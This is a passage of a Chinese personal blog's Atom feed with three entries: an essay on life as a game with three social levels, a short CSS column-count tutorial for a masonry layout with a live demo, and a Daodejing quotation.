title="三追求"></a>三追求</h3><p>这是世界是一款游戏叫“生”</p><p>那我们每个人在其中都是一款子游戏，叫人生</p><p>它既然是一款游戏，那它就应该有道道、有攻略</p><p>个人生的结构应是怎样的呢</p><p>硬要给它划分你会发现其实很简单</p><p>可以给他划分成三个层次</p><p>我们把整个世界整个社会看成一个大机器</p><p>你会发现第一个层面</p><p>也是绝大部分人所在的层面</p><p>“技能层面”</p><p>在这个层面的人需要把自己打磨成这个大机器需要的某种零件或工具</p><p>然后安装进去不间断运行</p><p>大机器就能给我们一个约定好的回报——工资or奖金</p><p>它的好处就是稳，短期内几乎没有风险</p><p>弊端就是长期几乎是无穷大的风险</p><p>这是第一层，我想绝大部分人所在这个层面，无需多说</p><p>看第二层</p><p>第二层突然就只剩5%的人了，或者可能不到5%</p><p>“产权层面”</p><p>这个层面的人，他永远只思考一件事情</p><p>就是我们怎么才能在这个大机器上拥有点什么</p><p>让这个大机器的某一部分是我的</p><p>广厦千万间能不能有我一间，然我我租出去</p><p>他永远在想这个问题</p><p>做得好的呢他这个广厦千万间可能就在北上广</p><p>做得不好的呢可能在十八线</p><p>所以产权这个游戏他范围非常宽广</p><p>他不光投资算，创业也算</p><p>甚至自己写个小说或者创业也算</p><p>包括哪怕生个娃其实本质上也算一个产权游戏</p><p>这属于第二个层面</p><p>第三个层面就更有意思了</p><p>只有5%里的5%的人了</p><p>大约就是千分之一到万分之一的人在玩这个游戏</p><p>“关系层面”</p><p>关系这个层面它有意思的在哪里</p><p>他在意的是去定义这个机器的功能</p><p>他不是拥有，他也不需要拥有</p><p>因为你想他在画圈的时候，定义那块干什么，那块怎么组织</p><p>他连这个圈都能画了</p><p>他还不能决定这个圈是谁的吗</p><p>这样你会发现这规律、这结构出来了</p><p>“关系定义了产权”</p><p>“产权定义了技能”</p><p>一切决定了我们的命运的走向</p><h3 id="番外：文凭就是产品合格证"><a href="#番外：文凭就是产品合格证" class="headerlink" title="番外：文凭就是产品合格证"></a>番外：文凭就是产品合格证</h3><p>教育的目的是干什么？</p><p>肯定不是为了拓宽人类认知边界</p><p>而是为了培养一批“通用生物计算机”</p><p>这样的话文凭就是产品合格证</p><p>而且还是那种不太靠谱的合格证</p><p>那合格证的目的是什么？</p><p>是为了博得客户的信任</p><p>既然是为了博得客户的信任</p><p>那我们花费这么大的代价</p><p>这么长的时间</p><p>这个代价是不是有点太大了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;我们需要的是一份水涨船高的事业&quot;&gt;&lt;a href=&quot;#我们需要的是一份水涨船高的事业&quot; class=&quot;headerlink&quot; title=&quot;我们需要的是一份水涨船高的事业&quot;&gt;&lt;/a&gt;我们需要的是一份水涨船高的事业&lt;/h3&gt;&lt;p&gt;工作❌  事业✅&lt;/p&gt;
&lt;p&gt;我们</summary>
      
    
    
    
    <category term="碎碎念" scheme="http://damao2250.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="窄门大道" scheme="http://damao2250.com/tags/%E7%AA%84%E9%97%A8%E5%A4%A7%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>简易瀑布流布局</title>
    <link href="http://damao2250.com/2024/09/30/%E7%AE%80%E6%98%93%E7%80%91%E5%B8%83%E6%B5%81%E5%B8%83%E5%B1%80/"/>
    <id>http://damao2250.com/2024/09/30/%E7%AE%80%E6%98%93%E7%80%91%E5%B8%83%E6%B5%81%E5%B8%83%E5%B1%80/</id>
    <published>2024-09-30T01:07:00.000Z</published>
    <updated>2025-05-09T04:06:36.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">.container</span> <span class="token punctuation">&#123;</span>    <span class="token property">column-count</span><span class="token punctuation">:</span> 4<span class="token punctuation">;</span> <span class="token comment">/* 定义列数 */</span>    <span class="token property">column-gap</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span> <span class="token comment">/* 定义列与列之间的间隙 */</span>  <span class="token punctuation">&#125;</span>  <span class="token selector">.item</span> <span class="token punctuation">&#123;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> #f2f2f2<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span>    <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span> <span class="token comment">/* 定义每项的底部间隙 */</span>    <span class="token property">break-inside</span><span class="token punctuation">:</span> avoid<span class="token punctuation">;</span> <span class="token comment">/* 防止内容被分割到不同的列 */</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 14<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Item 15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><style>  .container-test {    column-count: 4; /* 定义列数 */    column-gap: 16px; /* 定义列与列之间的间隙 */  }  .item-test {    background-color: #f2f2f2;    padding: 8px;    margin-bottom: 16px; /* 定义每项的底部间隙 */    break-inside: avoid; /* 防止内容被分割到不同的列 */  }</style><div class="container-test">  <div class="item-test">Item 1</div>  <div class="item-test">Item 2 Item 2 Item 2 Item 2 Item 2 Item 2 Item 2 </div>  <div class="item-test">Item 3</div>  <div class="item-test">Item 4 Item 4 Item 4 Item 4 Item 4 Item 4 Item 4 Item 4 Item 4 Item 4 Item 4 </div>  <div class="item-test">Item 5</div>  <div class="item-test">Item 6</div>  <div class="item-test">Item 7</div>  <div class="item-test">Item 8</div>  <div class="item-test">Item 9 Item 9 Item 9 Item 9</div>  <div class="item-test">Item 10</div>  <div class="item-test">Item 11</div>  <div class="item-test">Item 12</div>  <div class="item-test">Item 13</div>  <div class="item-test">Item 14</div>  <div class="item-test">Item 15</div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-html&quot; data-language=&quot;html&quot;&gt;&lt;code class=</summary>
      
    
    
    
    <category term="HTML" scheme="http://damao2250.com/categories/HTML/"/>
    
    
    <category term="CSS" scheme="http://damao2250.com/tags/CSS/"/>
    
    <category term="HTML" scheme="http://damao2250.com/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>治大国</title>
    <link href="http://damao2250.com/2024/09/30/%E6%B2%BB%E5%A4%A7%E5%9B%BD/"/>
    <id>http://damao2250.com/2024/09/30/%E6%B2%BB%E5%A4%A7%E5%9B%BD/</id>
    <published>2024-09-30T00:35:02.000Z</published>
    <updated>2025-05-09T04:09:12.278Z</updated>
    
    <content type="html"><![CDATA[<p>治大国，若烹小鲜。</p><p>以道莅天下，其鬼不神；非其鬼不神，其神不伤人；非其神不伤人，圣人亦不伤人。</p><p>夫两不相伤，故德交归焉。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;治大国，若烹小鲜。&lt;/p&gt;
&lt;p&gt;以道莅天下，其鬼不神；非其鬼不神，其神不伤人；非其神不伤人，圣人亦不伤人。&lt;/p&gt;
&lt;p&gt;夫两不相伤，故德交归焉。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="碎碎念" scheme="http://damao2250.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="阅读记录" scheme="http://damao2250.com/tags/%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
</feed>
